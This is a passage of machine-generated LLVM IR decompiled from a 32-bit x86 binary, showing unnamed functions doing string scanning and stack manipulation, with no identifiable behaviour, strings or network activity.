  %v4_80499ab = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_8051cf0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00185 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00185, i1* %zf.global-to-local, align 1
  %v2_8049a03187 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03187, align 4
  %v2_8049a05188 = call i32 @function_8052452(i32* %v1_80484ea)
  store i32 %v2_8049a05188, i32* %eax.global-to-local, align 4
  %v0_8049a0a189 = load i32, i32* @esp, align 4
  %v1_8049a0a190 = add i32 %v0_8049a0a189, 16
  %v1_8049a0d191 = load i32, i32* @ebx, align 4
  %v7_8049a0d192 = icmp ult i32 %v2_8049a05188, %v1_8049a0d191
  %v12_8049a0d193 = icmp eq i32 %v2_8049a05188, %v1_8049a0d191
  store i1 %v12_8049a0d193, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d192, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a194 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a189, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a194, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a194 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8053d40(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_8052452(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a190, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054acb.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054ac4.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_8051ca0()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8054ad5.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8051f60()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_805285e()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_80526f3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76171 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76171, i32* %ecx.global-to-local, align 4
  %v2_8049b79172 = add i32 %v0_8049b54, 20916
  %v3_8049b79173 = inttoptr i32 %v2_8049b79172 to i32*
  store i32 1, i32* %v3_8049b79173, align 4
  %v0_8049b80174 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80175 = inttoptr i32 %v0_8049b80174 to i8*
  %v2_8049b80176 = load i8, i8* %v1_8049b80175, align 1
  %v3_8049b80177 = zext i8 %v2_8049b80176 to i32
  %v4_8049b80178 = load i32, i32* @edx, align 4
  %v5_8049b80179 = and i32 %v4_8049b80178, -256
  %v6_8049b80180 = or i32 %v5_8049b80179, %v3_8049b80177
  store i32 %v6_8049b80180, i32* %edx.global-to-local, align 4
  %v4_8049b82181 = icmp eq i8 %v2_8049b80176, 0
  store i1 %v4_8049b82181, i1* %zf.global-to-local, align 1
  %v1_8049b84182 = icmp eq i1 %v4_8049b82181, false
  br i1 %v1_8049b84182, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80184 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80176, %dec_label_pc_8049b65 ]
  %v0_8049b80183 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80174, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80184, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp147 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp147, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
